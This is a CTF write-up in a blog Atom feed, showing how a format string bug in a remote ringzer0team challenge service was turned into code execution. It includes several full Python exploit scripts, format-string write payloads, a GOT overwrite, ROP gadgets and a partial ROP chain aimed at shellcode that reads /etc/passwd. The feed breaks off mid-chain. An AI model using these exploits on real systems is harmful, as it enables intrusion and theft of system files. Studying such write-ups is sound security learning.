<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-02-22T18:21:49+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution]]></title>
    <link href="http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/"/>
    <updated>2015-02-22T13:01:22+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution</id>
    <content type="html"><![CDATA[<p>You might remember my first <a href="https://staringintodevnull.blogspot.nl/2014/09/maximum-overkill-rop-exploit-for.html">Maximum Overkill writeup</a>, where I made a ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise. I completed another over-the-top, why-would-you-even-do-this exploit for a CTF challenge and figured I&rsquo;d shared it.</p>

<!-- more -->


<p><a href="http://ringzer0team.com">ringzer0team</a> has a very nice, long-running CTF going on. I already did the <a href="https://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">shellcoding challenges</a>, which I really enjoyed. I completed the fourth pwnable level on an evening, which simply involved dumping the stack via a format string bug and grabbing a password. I thought to myself: &ldquo;would I be able to get a shell using this format string vulnerability?&rdquo;</p>

<p>This writeup is made with Hindsight<sup>tm</sup> and as such, I have not included all the paths that led nowhere or the mistakes I have made. I have tried to include the thought-process as much as possible.</p>

<h2>Dumping the Stack</h2>

<p>OK, onwards! One catch is that the remote box is a 64-bit system and I don&rsquo;t have the binary itself. We do have a snippet of source code and the ability to dump the stack from within a vulnerable <code>sprintf</code> call:</p>

<pre><code class="c">    char *response = NULL;
    char *cleanBuffer = NULL;

    response = (char*)malloc(2048);
    memset(response, 0, 2048);

    cleanBuffer = (char*)malloc(strlen(buf));
    memset(cleanBuffer, 0, strlen(buf));

    strncpy(cleanBuffer, buf, strlen(buf) - 1);

    char test[] = "AAAABBBBCCCC";
    char flag[] = "XXXXXXXXXXXXXXXXXXXXXXXXXX";

    if(strcmp(flag, cleanBuffer) == 0) {
        strcpy(response, "Here's your flag FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXX.\n");
    } else {
        sprintf(response, cleanBuffer); // &lt;-- we have a format string vulnerability here
        sprintf(response, "%s is a wrong password.\n\nPassword:", response);
    }
</code></pre>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%lx-%lx-%lx-%lx-%lx-%lx-
17f4880-25-0-80-7fffd6e74448-200000000- is a wrong password.
</code></pre>

<p>The fifth address jumps out. It is either a stack address, or a <code>libc</code> address. Let&rsquo;s see what it points to:</p>

<p><img src="/assets/maximum-overkill-two/00-what-does-the-stack-contain.png" alt="" /></p>

<p>I tried to write to it using <code>%n</code>, which didn&rsquo;t crash the remote binary. This meant that it most likely is a stack address! I wrote a small python script to dump the stack. I noticed I could not re-use the connection I made via python sockets, so I had to reconnect for every format string I sent.</p>

<pre><code class="python">import struct
from socket import *

def grab(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = data.split()[0]

    print i, addr
    s.close()

for z in range(700):
    grab(z)
</code></pre>

<p>This indeed dumped out the data on the stack. I found where the fifth parameter was pointing to:</p>

<pre><code>...snip...
633 7fffeecd9c28
634 1c
635 2
636 7fff00000042
637 7fffeecdaf65
638 0
...snip...
</code></pre>

<p>See, it points to the 636th parameter, because the lower 32 bits contain the value I&rsquo;ve just written with <code>%n</code>! Pretty neat. So with <code>%&lt;parameter number&gt;$lx</code> I could view what that particular parameter contained, and with <code>%&lt;parameter number&gt;$s</code> I could see what it pointed to (provided it was pointing to a valid memory address!) I wondered where the 636th parameter pointed to:</p>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%636$lx
7fff3ca49f51 is a wrong password.

Password:%636$s
/home/crackme/fs_64 is a wrong password.
</code></pre>

<p>Interesting! I figured I could use this to my advantage&hellip; The 5th parameter points to the 636th, which itself points to somewhere on the stack. I could write to the address contained in the 636th parameter, like so:</p>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%636$lx
7fff3ca49f51 is a wrong password.

Password:%636$s
/home/crackme/fs_64 is a wrong password.

Password:%66c%636$hhn                  
                                                                 ï¿½ is a wrong password.

Password:%636$s
Bhome/crackme/fs_64 is a wrong password.
</code></pre>

<h2>Write what where now?</h2>

<p>But more importantly, I could write <strong>to</strong> the 636th parameter <em>via</em> the fifth, giving me a write-what-where primitive! So, for instance, to write to <code>0x7fff3ca49f00</code>, I&rsquo;d first do <code>%256c%5$hhn</code>. This will overwrite the last byte of the 636th parameter with a NULL. Then, I&rsquo;d write to the address using <code>%66c%636$hhn</code>. Finally, I&rsquo;d like to know where this byte was written, which turned out to be the easiest: we have the address of <code>636</code>, and we have another address <code>0x7fff3ca49f00</code>. Subtracting the first from the latter and dividing by 8 gives the format string parameter we need to access the written byte directly! I wrote a simple proof-of-concept for this.</p>

<p>The following python code abuses the format string vulnerability to write out &lsquo;BAS&rsquo; to an area on the stack. We can access it indirectly with <code>%636$s</code> and directly using <code>%&lt;parameter&gt;$lx</code>, given the proper format parameter. The funny thing that I noticed was that my changes to the stack were persistent, even after reconnecting. This meant that the binary did not fork(), but handled each request by itself. This is interesting for later&hellip;</p>

<pre><code class="python">import struct
from socket import *

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

# this will write out 'BAS',0 to the scratch area!
# update the pointer
write_byte_value_via(5, 1)
# write a byte to the scratch area
write_byte_value_via(636, ord('B'))
# update the pointer
write_byte_value_via(5, 2)
# write a byte to the scratch area
write_byte_value_via(636, ord('A'))
write_byte_value_via(5, 3)
write_byte_value_via(636, ord('S'))
write_byte_value_via(5, 4)
# write out a NULL byte first writing out 256 bytes (which wraps to 0x00)
write_byte_value_via(636, 256)

# reset the pointer
write_byte_value_via(5, 1)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# CAN ADDRESS IT DIRECTLY!!
scratch_addr = grab_value_directly(636+format_offset)
print "scratch contains: ", hex(scratch_addr)
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5$ python sploit1.py 
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f51
scratch contains:  0x534142
scratch is parameter 1601
scratch contains:  0x53414200
</code></pre>

<p>This is great, because I have a write-what-where primitive know! My first thought was to overwrite a GOT entry with <code>system()</code>. For that to work, I needed several things: the address of system() in libc, and thus which version of libc I was dealing with; and the address of a GOT pointer which I could overwrite. First things first, I wrote a dumper script to start dumping the binary.</p>

<h2>Slam Dump </h2>

<p>Using the <code>write-an-address-to-scratch-space</code> primitive, I started dumping the binary. I added a function to dump from a specific memory address and I verified it by grabbing the bytes at <code>0x400000</code>. These should correspond to the magic bytes of an ELF header.</p>

<pre><code class="python">import struct
from socket import *

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

def read_from_address(addr, offset):
    for i in range(4):
        b = (addr &amp; 0xff)
        addr &gt;&gt;= 8
        if b == 0:
            b = 256
        if i == 0:
            i = 256
        write_byte_value_via(5, i)      # change address
        write_byte_value_via(636, b)    # write byte

    dump1 = grab_value_indirectly(636+offset)
    return hex(dump1)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

print "read from 0x400000: {}".format(read_from_address(0x400000, format_offset))
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5$ python sploit3.py
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f01
scratch contains:  0x7369
scratch is parameter 1601
read from 0x400000: 0x10102464c457f
</code></pre>

<p>Indeed, this dumps out the ELF header&rsquo;s magic bytes! By this time, I noticed that trying to read from an address that contains a NULL byte as the first byte, returns 0x7369. I used this in the dumper to identify NULL bytes.</p>

<p>From here on out, I adjusted the script to dump out the entire binary. It was a slow process, but I managed to speed it up a bit by not having it write out the full address each time, and dumping as much bytes as possible (I adjusted the <code>grab_value_indirectly</code>). The problem with the dumping process via <code>sprintf</code> is that it stops dumping bytes when it hits a <code>0x0a</code>, <code>0x0d</code> or <code>0x00</code> byte. I have no way of knowing which one it actually is, so I assumed NULL bytes. This gave me an imperfect dump, which I could not run and <code>readelf</code> could not make heads or tails of the section headers.</p>

<p>This meant that I had no way of knowing exactly where each GOT entry was, and which function address each entry held. Reverse engineering the dumped binary provided an alternative. I was looking at the output of <code>xxd</code> and noticed the following:</p>

<pre><code class="bash">...snip...
00014a0: ffc7 8580 edff ff41 4141 41c7 8584 edff  .......AAAA.....
00014b0: 0042 4242 42c7 8588 edff ff43 4343 43c6  .BBBB......CCCC
...snip...
</code></pre>

<p>This looks familiar, doesn&rsquo;t it?</p>

<pre><code class="c">char test[] = "AAAABBBBCCCC";
</code></pre>

<p>I out those bytes, starting at 0x1260, and ran the resulting string through <code>rasm2</code>. This gave me the raw bytes:</p>

<pre><code class="bash">$ xxd -c 1 dump |grep 1260 -A512 | awk '{print $2}' |tr -d '\n'
b800000000e8b6f8ffffc78540edffff48460052c78544edffff656d6f74c78548edffff
65005365c7854cedffff63757265c78550edffff00536865c78554edffff6c6c005bc785
...snip...
</code></pre>

<p>I ran this output through <code>rasm2</code> to show the corresponding assembly code. I put in the correct starting address for rasm2. This is the address of the start of the binary (0x400000) plus the offset from which I&rsquo;ve dumped, 0x1260. A bit of reverse-engineering led me to identify <code>malloc</code>, <code>memset</code> and <code>strlen</code>:</p>

<pre><code class="bash">$ echo 'b800...' | rasm2 -d -b 64 -o 0x401260 -

mov dword [rbp-0x50], 0x0
mov eax, [rbp-0x20]
cmp eax, [rbp-0x1c]
jnz dword 0x4015d1
// char *response = NULL;
mov qword [rbp-0x58], 0x0       
// char *cleanBuffer = NULL;
mov qword [rbp-0x60], 0x0   
// response = (char*)malloc(2048);  
mov edi, 0x800                  
call dword 0x400ba0             
mov [rbp-0x58], rax
// memset(response, 0, 2048);
mov rax, [rbp-0x58]
mov edx, 0x800
mov esi, 0x0
mov rdi, rax
call dword 0x400b40
// cleanBuffer = (char*)malloc(strlen(buf));
lea rax, [rbp-0x11f0]
mov rdi, rax
call dword 0x400b00 
mov rdi, rax
call dword 0x400ba0
mov [rbp-0x60], rax
lea rax, [rbp-0x11f0]
</code></pre>

<p>Now, these calls go to the PLT, which uses an address located in the GOT to do the actual library call. From the disassembly and the raw bytes, I was able to find out to which memory address the calls go. For example, let&rsquo;s find the address of the GOT entry for <code>strlen</code>. From the disassembly provided above, I know it&rsquo;s PLT stub is at <code>0x400b00</code>, so dumping from <code>0xb00</code>:</p>

<pre><code>0000b00: ff25 fa0f 0000 6807 0000 00e9 70ff ffff  .%....h.....p...
</code></pre>

<p>This disassembles to</p>

<pre><code class="bash">$ rasm2 -d -b 64 -o 0x400b00 -
ff25fa0f0000
jmp qword [rip+0xffa]
</code></pre>

<p>So it actually references the QWORD at <code>0x400b00</code> + <code>6</code> + <code>0x0ffa</code>, which is <code>0x401b00</code>. This made no sense to me, and it still doesn&rsquo;t. I know for a fact that the GOT is actually at <code>0x60xxxx</code>, so I took a chance and dumped the bytes from that location. This indeed contained a libc address! Assuming my reversing skills are okay, I have a way to read two libc addresses to two known functions! This would allow me to identify which libc version is in use and get me one step closer to my goal of shelling this challenge out.</p>

<h2>libc Version: Computer Says No</h2>

<p>To identify the libc version in use, I&rsquo;d need two libc addresses and the corresponding function names. I could compare the difference of these addresses to those found on the libc binaries I had. I used my <a href="https://gist.github.com/barrebas/e99194a4ac8b5252773c">own little script</a> for this. Alas, I found no exact match, even though I had downloaded all the libc versions that Debian provided. It did seem, however, that the libc in use on the remote box was very similar to <a href="https://packages.debian.org/wheezy/amd64/libc-bin/download">libc 2.13-38</a>. This gave me a handle and soon I was dumping from libc. I did this by first grabbing <code>strlen</code> from the GOT, and then subtracting the offset of <code>strlen</code>. This yielded a wrong libc base, but it was good enough to use a reference in combination with libc-2.13-38.</p>

<p>I decided to look for <code>system()</code> the old fashioned way: by dumping all the bytes from the <code>libc_base + system_offset_in_libc-2.13</code> - 0x1000 to +0x1000. In these bytes, I found <code>system()</code> at -0x90:</p>

<pre><code>0000f70: 5348 83ec 1048 85ff 7416 8b05 4ca9 3400  SH...H..t...L.4.
0000f80: 85c0 7526 4883 c410 5be9 82fb ffff 6690  ..u&amp;H...[.....f.
</code></pre>

<p>You see, <code>system()</code> in libc 2.13 looks like this:</p>

<pre><code>objdump -d -M intel libc-2.13.so |grep system -A10

000000000003fc70 &lt;__libc_system&gt;:
   3fc70:   53                      push   rbx
   3fc71:   48 83 ec 10             sub    rsp,0x10
   3fc75:   48 85 ff                test   rdi,rdi
   3fc78:   74 16                   je     3fc90 &lt;__libc_system+0x20&gt;
   3fc7a:   8b 05 6c b9 34 00       mov    eax,DWORD PTR [rip+0x34b96c]        # 38b5ec &lt;argp_program_version_hook+0x1b4&gt;
   3fc80:   85 c0                   test   eax,eax
   3fc82:   75 26                   jne    3fcaa &lt;__libc_system+0x3a&gt;
   3fc84:   48 83 c4 10             add    rsp,0x10
   3fc88:   5b                      pop    rbx
   3fc89:   e9 82 fb ff ff          jmp    3f810 &lt;__strtold_l+0x10&gt;
   3fc8e:   66 90                   xchg   ax,ax
</code></pre>

<p>That&rsquo;s a perfect match! I had the address of system. I turned my attention to overwriting a GOT entry. I settled on overwriting <code>strlen</code>&rsquo;s GOT entry. After the overwriting was done, the next connection would use my <code>buf</code> as input for <code>system()</code>:</p>

<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
// disassembly:
lea rax, [rbp-0x11f0]
mov rdi, rax
call dword 0x400b00 &lt; the GOT entry for strlen will be pointing to system!
</code></pre>

<p>The addresses for <code>strlen</code> and <code>system</code> only differed in the last three bytes. Therefore, I had to figure out a way to write three bytes at the same time; if I overwrote one byte each time, then by the time I connected to overwrite the second byte, I&rsquo;d get a crash. This is because the GOT entry for strlen would be pointing to a rather random memory location!</p>

<p>So, writing three bytes at once requires three memory address to be present on the stack, which can be addressed directly. From there, I again used the <code>%&lt;number&gt;%&lt;offset&gt;$hhn</code> primitive to write a byte.</p>

<pre><code class="python">def write_on_stack(what, where, offset):
    # write out all the bytes of what
    # used to write addresses on the stack
    for i in range(8):
        b = (what &amp; 0xff)
        what &gt;&gt;= 8
        if b == 0:
            b = 256
        if (i+where) == 0:
            i = 256
        write_byte_value_via(5, i+where)
        write_byte_value_via(636, b)
    print "[+] wrote {} to {}".format(hex(grab_value_directly(636+offset+where/8)), 636+offset+where/8)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# grab strlen from the GOT entry
strlen_addr = read_from_address(0x601b00, format_offset)

print "[+] strlen is at {}.".format(hex(strlen_addr))
# from libc-2.13-38 -- NOT CORRECT
libc_base = strlen_addr - 0x80b70
print "[+] libc_base is at {}.".format(hex(libc_base))

# we need to have three addresses on the stack which we can directly address
# to use them in the format string vuln 
write_on_stack(0x601e20, 0, format_offset)
write_on_stack(0x601e21, 8, format_offset)
write_on_stack(0x601e22, 16, format_offset)

# ok, now try to set three bytes in one go
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))

# should write out "BAS" in one go
payload = "%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)

s.recv(128)
s.send(payload)
data = s.recv(64)
s.close()

# read it back to check!
check = read_from_address(0x601e20, format_offset)
print hex(check)
</code></pre>

<p>First, it writes out <code>0x601e20</code>, <code>0x601e21</code> and <code>0x601e22</code> on the stack. <code>0x601e20</code> is an unused memory address close the GOT entries. Then, the payload to actually write three bytes to those addresses looks like this:</p>

<pre><code>"%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)
</code></pre>

<p>What it does, is print 66 dummy bytes (0x42 == &lsquo;B&rsquo;) and then writes out the number of bytes written so far (<code>%hhn</code>) to a location that is pointed to by parameter 636. Then, it prints 255 dummy bytes, to make the write counter overflow. Writing out the next byte with <code>%hhn</code> will output 66+255 % 256 = 61, &lsquo;A&rsquo;). The next byte is written in the same way. This allows three bytes to be written at once, and will allow overwriting the GOT entry of strlen with the address of system!</p>

<pre><code class="bash">$ python sploit7.py 
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f01
scratch contains:  0x601b
scratch is parameter 1601
[+] strlen is at 0x7f82b7326c40.
[+] libc_base is at 0x7f82b72a60d0.
[+] wrote 0x601e20 to 1601
[+] wrote 0x601e21 to 1602
[+] wrote 0x601e22 to 1603

0x534142
</code></pre>

<p>OK, so that worked! I plugged in the values for system, the GOT entry for strlen and crossed my fingers. I tried to spawn a shell, but alas, no output. The binary had crashed though, and I tried again, this time trying for outbound access to my vps with <code>wget</code>. However, I never saw a HTTP connection and the remote binary seemed to hang. The service did not come back up. Uh-oh.</p>

<h2>Reaching out</h2>

<p>I apologized to <a href="https://twitter.com/MrUn1k0d3r">Mr.Un1k0d3r</a> via Twitter and he seemed interested in my poc. He even offered me to send the binary so I could play with it locally; I jumped at this chance of course, and requested the libc as well. Furthermore, he informed me that the box was heavily firewalled for security reasons (it being part of a CTF and all) and that my shell would not be accessible at all&hellip;</p>

<p>&hellip;Challenge accepted! :)</p>

<p>So it&rsquo;s back to the drawing board. The <code>system()</code> trick would not work, as the binary was not being ran using <code>socat</code>. It handled all the connections itself. Spawning a shell would not connect stdin, stdout and stderr to the socket that the binary was using, effectively stopping me from interacting with the shell.</p>

<p>Instead, I figured I could achieve an interactive shell by first using a call to <code>dup2</code> to duplicate the socket file descriptor, to couple it to stdin and stdout. This was inspired by <a href="http://shell-storm.org/shellcode/files/shellcode-881.php">this shellcode</a>.</p>

<p>First things first, though, I needed a ROP chain to actually read in the shellcode and run it. The stack was not executable (NX took care of that), so I had find a way to call <code>mprotect</code> to mark a section <code>rwx</code> and then <code>read</code> in the shellcode.</p>

<p>I started working on the ROP chain before Mr. Un1k0d3r sent over the files. This was pretty hard, as I had to search for the gadgets in libc (the binary did not contain enough gadgets) by dumping it. I first uploaded my own libc to <a href="http://ropshell.com">ropshell</a>. Once I had found a gadget, I dumped from -0x100 to +0x100 relative to that address; this allowed me to find the gadgets I needed. Luckily, soon after, I obtained the libc and the binary from Mr.Un1k0d3r, which helped a lot. I ran it in a 64-bit Kali (based on Debian) and started building and debugging my ROP exploit. But hold on a second!</p>

<h2>Pivot the Stack</h2>

<p>This wasn&rsquo;t a buffer overflow where I had full control over the stack! The ROP chain was somewhere in <code>buf</code> and I needed to make <code>rsp</code> point to it. Only then, the ROP chain would kick off properly. I had to find a single gadget that did this in one go. I roughly knew the location of <code>buf</code> relative to <code>rsp</code> (approximately at <code>rsp+0xd8</code>, which I reverse-engineered from the disassembly of the dumped binary). Why <code>buf</code>? <code>buf</code> <strong>can</strong> contain null bytes, whereas <code>cleanBuffer</code> cannot:</p>

<pre><code class="c">strncpy(cleanBuffer, buf, strlen(buf) - 1);
</code></pre>

<p>The strncpy takes care of that; any null byte it encounters will make it stop copying. Because we&rsquo;re on 64-bit, the gadget addresses will for sure contain null bytes. Instead, have a look at where <code>strlen</code> is used:</p>

<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
// dissambled:
lea rax, [rbp-0x11f0]
mov rdi, rax        // rax and rdi now point to buf
call dword 0x400b00 // strlen
</code></pre>

<p>This meant that I had multiple options to pivot <code>rsp</code> to <code>buf</code>, for instance with a <code>xchg rax, rsp</code> gadget. Upon finding no suitables ones, I had to go with stack lifting. I uploaded the libc which I got from Mr. Un1k0d3r to ropshell.com and starting looking for gadgets. What would I need?</p>

<pre><code>stack lifting
syscall
pop rax
pop rdi
pop rsi
pop rdx
</code></pre>

<p>See, I needed quite a few gadgets to be able to call <code>mprotect</code> and <code>read</code>. First, the stack lifting: I settled on <code>0x00082cfe: add rsp, 0x100; ret</code> in libc. I had no idea if I would have the correct amount added to <code>rsp</code>, but I solved that the lazy way by adding the ROP equivalent of a NOP-sled:</p>

<pre><code>0x041cf9: ret
</code></pre>

<p>This will keeping returning until the ROP chain hits the next correct gadget! I put everything together and tested it locally&hellip; but no dice! I debugged it in <code>gdb-peda</code> and the <code>mprotect</code> syscall seemed to work. The shellcode, however, was not being read in properly. The socket file descriptor was the problem. It was not a predictable value, so I could not hardcode it. I found that the socket was stored on the stack, but I could not leak it via the format string vulnerability. It was located at <code>rbp-0x48</code>, so I had to adjust my ROP chain to grab this value and use it in the <code>read</code> syscall. I had to build another ROP chain to get at it&hellip;</p>

<h2>Grabbing the socket descriptor value</h2>

<p>I started looking for gadgets that allowed me to dereference <code>rbp</code>. I ended up with these ones:</p>

<pre><code>0x0002028a : pop r15; ret
0x0006933f : lea rax, [rbp + r15]; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x000eb938 : mov rax, [rax]; ret
0x0002c10e : xchg eax, edi; ret
</code></pre>

<p>The process is simple. The first <code>pop r15</code> will pop <code>-0x48</code> from the stack. Then, the address <code>rbp+r15</code> (effectively pointing to <code>rbp-0x48</code>) is loaded into <code>rax</code>. The value at this address is taken into <code>rax</code> in the third gadget. Finally, the value is stored in <code>edi</code>, ready for use in the <code>read</code> syscall. Here, I assume that the socket descriptor is less than 32 bits, which I think is reasonable. The <code>read</code> part of the ROP chain will read in the shellcode that we send and return to it.</p>

<p>I started with a modified read /etc/passwd shellcode, the <a href="http://shell-storm.org/shellcode/files/shellcode-878.php">original</a> of which was made by Mr.Un1k0d3r :)</p>

<h2>Putting it all together</h2>

<p>So from a high level, I use the format string vulnerability to write out the addresses of the first three bytes of the GOT entry of <code>strlen</code> to the stack. Then, using those addresses, the first three bytes of strlen&rsquo;s GOT entry are overwritten. The GOT entry of strlen then points to the stack lifting gadget. Upon connecting again, I send the ROP chain, the stack lifting gadget will be called instead of strlen, setting <code>rsp</code> to <code>buf</code>. The ROP chain kicks off and will grab the socket descriptor value, call <code>mprotect</code> and <code>read</code> in a shellcode. The shellcode will also use the socket descriptor and write the contents of <code>/etc/passwd</code> to the socket. All I have to do now is to sit back :)</p>

<p>Without further ado:</p>

<pre><code class="python">import struct, time
from socket import *

def p(x):
    return struct.pack('L', x &amp; 0xffffffffffffffff)

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

def read_from_address(addr, offset):
    for i in range(4):
        b = (addr &amp; 0xff)
        addr &gt;&gt;= 8
        if b == 0:
            b = 256
        if i == 0:
            i = 256
        write_byte_value_via(5, i)      # change address
        write_byte_value_via(636, b)        # write byte

    dump1 = grab_value_indirectly(636+offset)
    return dump1

# write a value to a string format parameter
def write_on_stack(what, where, offset):
    # write out all the bytes of what
    for i in range(8):
        b = (what &amp; 0xff)
        what &gt;&gt;= 8
        if b == 0:
            b = 256
        if (i+where) == 0:
            i = 256
        write_byte_value_via(5, i+where)
        write_byte_value_via(636, b)
    print "[+] wrote {} to {}".format(hex(grab_value_directly(636+offset+where/8)), 636+offset+where/8)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# grab strlen from the GOT entry
strlen_addr = read_from_address(0x601b00, format_offset)

print "[+] strlen is at {}.".format(hex(strlen_addr))
libc_base = strlen_addr - 0x80c40
print "[+] libc_base is at {}.".format(hex(libc_base))

STACK_PIVOT = libc_base + 0x082cfe      # add rsp, 0x100; ret
print "[+] stack pivot gadget is at {}.".format(hex(STACK_PIVOT))

# we need to have three addresses on the stack which we can directly address
# to use them in the format string vuln 
# strlen
write_on_stack(0x601b00, 0, format_offset)
write_on_stack(0x601b01, 8, format_offset)
write_on_stack(0x601b02, 16, format_offset)

# need to write out the last three bytes of the STACK_PIVOT gadget over strlen's bytes
writebytes = STACK_PIVOT &amp; 0xffffff 

payload = ''
lastbyte = 0

# build format string to set three bytes at once
for i in range(3):
    if lastbyte &lt;= (writebytes &amp; 0xff):
        byte_to_write = (writebytes &amp; 0xff) - lastbyte
    else:   
        byte_to_write = 256 + (writebytes &amp; 0xff) - lastbyte

    payload += "%{}c".format(byte_to_write)
    lastbyte = writebytes &amp; 0xff

    writebytes &gt;&gt;= 8
    payload += "%{}$hhn".format(format_offset+636+i)

payload += "\n"

print "[+] writing {} to strlen's GOT entry".format(hex(STACK_PIVOT &amp; 0xffffff))

print "[+] format string payload: {}".format(payload)

# connect and send the format string
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))
s.recv(128)
s.send(payload)
s.recv(64)
s.close()


# now, strlen's GOT entry will point to the stack lifting gadget

# let's prepare the ROP chain
# here are the gadgets
SYSCALL = libc_base + 0x0ad215
POP_RAX = libc_base + 0x041dc8
POP_RSI = libc_base + 0x021535
POP_RDI = libc_base + 0x02028b
POP_RDX = libc_base + 0x0a834b

ropchain = ''
# mprotect 0x400000 to rwx, so we can write AND execute from it
ropchain += p(POP_RAX+1) * 8       # points to ret; effectively, a NOP!
ropchain += p(POP_RAX)
ropchain += p(10)                  # syscall mprotect
ropchain += p(POP_RDI)
ropchain += p(0x400000)            # start of buffer to mprotect
ropchain += p(POP_RSI)
ropchain += p(0x1000)              # length of buffer
ropchain += p(POP_RDX)
